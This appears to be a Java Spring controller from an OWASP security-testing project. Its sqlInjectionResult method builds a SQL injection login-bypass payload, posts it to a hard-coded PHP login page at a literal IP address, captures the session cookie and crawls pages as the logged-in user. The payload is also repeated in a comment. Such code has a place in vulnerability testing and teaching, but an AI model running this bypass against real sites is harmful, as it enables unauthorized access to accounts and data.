package com.devsec.owasp.controller;

import com.devsec.owasp.service.crawl.CrawlService;
import lombok.extern.slf4j.Slf4j;
import org.apache.jasper.tagplugins.jstl.core.Url;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.safety.Whitelist;
import org.jsoup.select.Elements;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.Map;

@Slf4j
@Controller
public class CrawlController {

    @Autowired
    CrawlService crawlService;

    /* 크롤링 url 폼*/
    @GetMapping("/crawl")
    public String crawlingForm(ModelMap model) throws Exception{
        try {

        }catch (Exception e){
            e.printStackTrace();
        }
        return "crawl/crawl_form";
    }

    /* SQL INJECTION FORM */
    @GetMapping("/sqlinjct")
    public String sqlInjectionForm(@RequestParam Map<String, String> params, ModelMap model) throws Exception{
        try {

        }catch (Exception e){
            e.printStackTrace();
        }
        return "owasp/sql_injection_form";
    }
    /* SQL INJECTION RESULT*/
    @PostMapping("/sqlinjct")
    public String sqlInjectionResult(@RequestParam Map<String, String> params, ModelMap model) throws Exception{
        String msg ="";
        String panel = "";
        String alert = "";

        try {
            /*** sql injection 취약점을 통한 로그인 ***/
            String URL = "http://182.219.28.68:8001/member/login_ok.php";
            String userId = params.get("userId");
            userId = "' or id="+"'"+userId+"'"+" #";

            /*크롤링한 정보로 로그인*/
            Connection.Response res =  Jsoup.connect(URL)
                    .data("id",userId, "pw","2")
                    .method(Connection.Method.POST)
                    .execute();
            String sessionId  = res.cookie("PHPSESSID");    //php session 담기
            log.debug("sessionId : "+sessionId);

            String resParse = res.parse().toString();

            if(resParse.contains("성공")){
                msg = "danger";
                panel = "panel-red";
                alert = "로그인 성공";
                log.debug("alert : "+alert);
            }else{
                msg = "clear";
                panel = "panel-primary";
                alert = "로그인 실패";
                log.debug("alert : "+alert);
            }
            /*** sql injection 취약점을 통한 로그인 ***/


            /*** 로그인후 크롤링 페이지 ***/
            Document doc = Jsoup.connect(params.get("moveUrl"))
                    .cookie("PHPSESSID",sessionId)
                    .get();

            model.addAttribute("result",doc.getElementById("member_idm"));
            model.addAttribute("html",doc.html());

        }catch (Exception e){
            msg = "clear";
            panel = "panel-primary";
            alert = "로그인 실패";
           e.printStackTrace();
        }
        model.addAttribute("panel",panel);
        model.addAttribute("msg",msg);
        model.addAttribute("alert",alert);

        return "owasp/sql_injection_result";
    }

    /* 크롤링 */
    @PostMapping("/crawl")
    public String crawling(@RequestParam Map<String, String> params, ModelMap model) throws Exception{
        try{

            String URL = params.get("scanUrl");
            Document document = Jsoup.connect(URL).get();
            log.debug("document : "+document.html());

            // ' or id='test1234' #

            Connection.Response res =  Jsoup.connect(URL)
                    .data("id","test02", "pw","a")
                    .method(Connection.Method.POST)
                    .execute();
            log.debug("parse : "+res.parse());
            String sessionId  = res.cookie("PHPSESSID");

            Document doc = Jsoup.connect("http://182.219.28.68:8001/member/info.php")
                    .cookie("PHPSESSID",sessionId)
                    .get();

            log.debug("doc :" + doc);

            model.addAttribute("input",document.getElementsByTag("input"));
            model.addAttribute("html",document.html());
            model.addAttribute("html2",document.html().toString());
            model.addAttribute("body",document.body());
            model.addAttribute("head",document.head());
            model.addAttribute("title",document.title());
            model.addAttribute("text",document.text());
            model.addAttribute("from",document.getElementsByTag("from"));
            model.addAttribute("table",document.getElementsByTag("table"));

            model.addAttribute("URL",URL);
        }catch (Exception e){

        }
        return "crawl/crawl_result";
    }

}

